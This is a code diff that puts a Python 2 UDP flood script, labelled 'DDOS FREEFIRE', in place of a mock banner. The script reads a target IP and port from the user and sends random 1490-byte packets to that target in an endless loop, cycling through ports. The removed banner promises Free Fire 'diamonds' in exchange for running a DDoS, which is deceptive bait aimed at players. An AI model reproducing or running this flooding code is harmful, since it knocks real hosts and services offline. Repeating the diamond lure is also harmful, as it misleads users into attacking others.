@@ -1,24 +1,50 @@
-#cd (filename)
-#python2 ddos-freefire.sh
-____  ____   ___  ____    _____ ____  _____ _____ _____ ___ ____  _____
-|  _ \|  _ \ / _ \/ ___|  |  ___|  _ \| ____| ____|  ___|_ _|  _ \| ____|
-| | | | | | | | | \___ \  | |_  | |_) |  _| |  _| | |_   | || |_) |  _|
-| |_| | |_| | |_| |___) | |  _| |  _ <| |___| |___|  _|  | ||  _ <| |___
-|____/|____/ \___/|____/  |_|   |_| \_\_____|_____|_|   |___|_| \_\_____|
-___________________________________
-| CREATE BY : VANZZX 666
-| VERION : 99.999.99
-| SCRIPT : DDOS ATTACK FREE FIRE 
-|_________________________________
-- CINTA SEMENTARA EPEP SELAMANYA -
-[01] DDOS ATTACK WEB *DIAMOND 9999*
-[02] DDOS ATTACK WEB *DIAMOND 100*
-DI PILIH [1/2] 
-#1 
-command: clear
-[IP ADDRESS/HOST -P -S  : 
-#[199%882%771%17% 80 100
-LOADING....
-SUCCES SEND TO DIAMOND 9999 KE 199%882%771%7 PORT 80 DENGAN 100 PAKET
-# cd
+import sys
+import os
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet DDOS FREEFIRE")
+print
+print "CREATOR    : VANNEZX 666"
+print "TEAM CYBER : DARK CYBER TEAM "
+print "NOMOR WA   : 6285171197674"
+print "WEBSITE    : https://www.atryxzofclone.com"
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet SIAP MENYERANG")
+print "[                    ] 0% "
+time.sleep(5)
+print "[=====               ] 25%"
+time.sleep(5)
+print "[==========          ] 50%"
+time.sleep(5)
+print "[===============     ] 75%"
+time.sleep(5)
+print "[====================] 100%"
+time.sleep(3)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 10
+     port = port + 10
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
